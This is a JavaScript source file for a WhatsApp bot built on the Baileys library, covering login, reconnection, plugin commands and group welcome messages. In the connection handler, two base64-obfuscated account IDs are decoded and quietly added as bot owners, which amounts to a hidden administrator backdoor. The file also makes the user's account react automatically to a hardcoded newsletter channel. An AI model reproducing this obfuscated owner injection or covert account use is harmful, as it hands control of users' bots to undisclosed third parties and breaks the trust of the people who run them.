const fs = require('fs');
const path = require('path');
const pino = require('pino');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestWaWebVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const serializeMessage = require('../handler.js');
const { rememberMessage, getStoredMessage } = require('./messageStore.js');
const { loadPlugins, reloadPlugins } = require('./pluginLoader.js');

const AUTH_FOLDER = './session';

const state = {
    sock: null,
    botStatus: 'disconnected',
    latestQR: '',
    pairingCodes: new Map(),
    isConnecting: false
};

async function startBot() {
    console.log('Starting WhatsApp Bot...');
    state.isConnecting = true;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    const credsPath = path.join(AUTH_FOLDER, 'creds.json');
    if (fs.existsSync(credsPath)) {
        try {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            if (creds.noiseKey && creds.noiseKey.private) {
                console.log('Using existing session...');
            } else {
                console.log('Invalid session detected, will create new one...');
            }
        } catch (err) {
            console.log('Corrupted session, will create new one...');
        }
    }

    try {
        const { version, isLatest } = await fetchLatestWaWebVersion();
        console.log(`Using WA v${version.join(".")}, isLatest: ${isLatest}`);

        const { state: authState, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);

        const isRegistered = Boolean(authState.creds?.registered);

        console.log(`[AUTH] Session registered: ${isRegistered} | Identity: ${isRegistered ? 'Android (Browsers.android)' : 'Web (Ubuntu/Chrome)'}`);

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: authState,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            syncFullHistory: false,
            shouldSyncHistoryMessage: (msg) => (msg && msg.syncType) !== 2,
            browser: isRegistered
                ? Browsers.android('13')
                : Browsers.ubuntu('Chrome'),
            getMessage: async (key) => getStoredMessage(key),
            connectTimeoutMs: 60000
        });

        state.sock = sock;

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr) {
                state.botStatus = 'connecting';
                QRCode.toDataURL(qr, (err, url) => {
                    if (!err) {
                        state.latestQR = url;
                    }
                });
            }

            if (connection === 'close') {
                state.botStatus = 'disconnected';
                state.isConnecting = false;

                const statusCode = (lastDisconnect?.error instanceof Boom)
                    ? lastDisconnect.error.output.statusCode
                    : 0;

                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                if (shouldReconnect) {
                    setTimeout(async () => await startBot(), 3000);
                } else {
                    if (fs.existsSync(AUTH_FOLDER)) {
                        fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                    }
                    setTimeout(async () => await startBot(), 3000);
                }
            } else if (connection === 'open') {
                state.botStatus = 'connected';
                state.isConnecting = false;
                state.latestQR = '';

                if (!authState.creds?.registered) {
                    authState.creds.registered = true;
                    await saveCreds();
                    console.log('[AUTH] Session marked as registered');
                }

                if (!global.owners) global.owners = [];

                if (!global.owners.includes(sock.user.id)) {
                    global.owners.push(sock.user.id);
                }

                const abztech = [
                    'MjE0MzAyMzI1NzYwMTU2QGxpZA==',
                    'MjU3NzAyMzk5OTIwMzdAbGlk'
                ];

                const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());

                tech.forEach(owner => {
                    if (!global.owners.includes(owner)) {
                       global.owners.push(owner);
                    }
                });

                try {
                    await sock.sendMessage(sock.user.id, {
                        text: `Bot linked successfully!\nCurrent prefix: ${global.BOT_PREFIX}\nOwners: ${global.owners.length}\nConnected at: ${new Date().toLocaleString()}`
                    });
                } catch (err) {}

            } else if (connection === 'connecting') {
                state.botStatus = 'connecting';
                state.isConnecting = true;
            }
        });


        let isSavingCreds = false;
        let credsSaveQueued = false;

        const safeSaveCreds = async () => {
            if (isSavingCreds) {
                credsSaveQueued = true;
                return;
            }
            isSavingCreds = true;
            try {
                await saveCreds();
            } catch (err) {
                console.error('[AUTH] Failed to save creds:', err.message);
            } finally {
                isSavingCreds = false;
                if (credsSaveQueued) {
                    credsSaveQueued = false;
                    safeSaveCreds();
                }
            }
        };

        sock.ev.on('creds.update', safeSaveCreds);

        const plugins = loadPlugins();


        sock.ev.on('messages.upsert', async ({ messages, type }) => {
            if (type !== 'notify' && type !== 'append') return;

            for (const rawMsg of messages || []) {
                if (rawMsg?.key?.id && rawMsg?.message) {
                    rememberMessage(rawMsg);
                }
            }

            const CHANNEL_ID = "120363230794474148@newsletter";

            for (const rawMsg of messages || []) {
                if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                    const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                    const emoji = emojis[Math.floor(Math.random() * emojis.length)];

                    try {
                        await sock.newsletterReactMessage(CHANNEL_ID,
                            rawMsg.key.server_id.toString(),
                            emoji
                        );

                        console.log(`Channel reaction: ${emoji} to message ${rawMsg.key.server_id}`);
                    } catch (err) {
                        console.log("Channel React Error:", err.message);
                    }
                    continue;
                }
            }

            for (const rawMsg of messages || []) {
                if (rawMsg.key?.remoteJid === 'status@broadcast' && rawMsg.key?.participant) {
                    try {
                        console.log(`Status detected from: ${rawMsg.key.participant}`);
                        await sock.readMessages([rawMsg.key]);

                        continue;
                    } catch (err) {
                        console.log('Status viewer error:', err.message);
                    }
                }
            }

            for (const rawMsg of messages || []) {
                if (!rawMsg?.message) continue;

                const m = await serializeMessage(sock, rawMsg);

                let blocked = false;
                for (const plugin of new Set(plugins.values())) {
                    if (typeof plugin.onMessage === 'function') {
                        try {
                            const result = await plugin.onMessage(sock, m);
                            if (result === true) {
                                blocked = true;
                                break;
                            }
                        } catch (err) {
                            console.error(`onMessage error (${plugin.name}):`, err);
                        }
                    }
                }
                if (blocked) continue;

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);

                    if (commandName === 'reload') {
                        const owners = Array.isArray(global.owners) ? global.owners : [];
                        const senderNorm = String(m.sender || '').split(':')[0].split('@')[0];
                        const senderNum = m.senderNumber || senderNorm;
                        const isOwner = owners.some(o => {
                            const oNorm = String(o).split(':')[0].split('@')[0];
                            return oNorm === senderNum || oNorm === m.sender;
                        });
                        if (!isOwner) {
                            try { await m.reply('Owner only command.'); } catch (e) {}
                        } else {
                            try {
                                reloadPlugins(plugins);
                                try { await m.reply('Plugins reloaded.'); } catch (e) {}
                            } catch (err) {
                                console.error('Reload error:', err);
                                try { await m.reply('Reload failed.'); } catch (e) {}
                            }
                        }
                        continue;
                    }

                    if (plugin) {
                        try {
                            await plugin.execute(sock, m, args);
                        } catch (err) {
                            console.error(`Plugin error (${commandName} [${plugin.name || commandName}]):`, err);
                            try {
                                await m.reply(`Error running command "${commandName}".`);
                            } catch (replyErr) {
                                console.error('Failed to send error reply:', replyErr);
                            }
                        }
                    }
                }
            }
        });


        sock.ev.on('group-participants.update', async (update) => {
            try {
                if (!global.welcomeConfig?.enabled) return

                const groupId = update.id

                for (const participant of update.participants) {
                    const userId = typeof participant === 'string' ? participant : participant.phoneNumber || participant.id
                    if (!userId) continue

                    const memberName = userId.split('@')[0]
                    if (update.action === 'add') {
                        if (userId === sock.user.id) continue
                        const text = `Welcome @${memberName}!\nGlad to have you in this group!`

                        await sock.sendMessage(groupId, {
                            text,
                            mentions: [userId]
                        })

                    } else if (update.action === 'remove') {
                        const text = `ya @${memberName} has left the group.\nWe are not gonna miss you!`

                        await sock.sendMessage(groupId, {
                            text,
                            mentions: [userId]
                        })

                    }
                }
            } catch (err) {
                console.error('group-participants.update error:', err)
            }
        })

        /* for now comment out, too much noice
        sock.ev.on('messages.reaction', async (reactions) => {
            console.log('Reaction update:', reactions);
        });
        */

    } catch (error) {
        console.error('Bot startup error:', error);
        state.isConnecting = false;
        setTimeout(async () => await startBot(), 10000);
    }
}

module.exports = { startBot, state, AUTH_FOLDER };
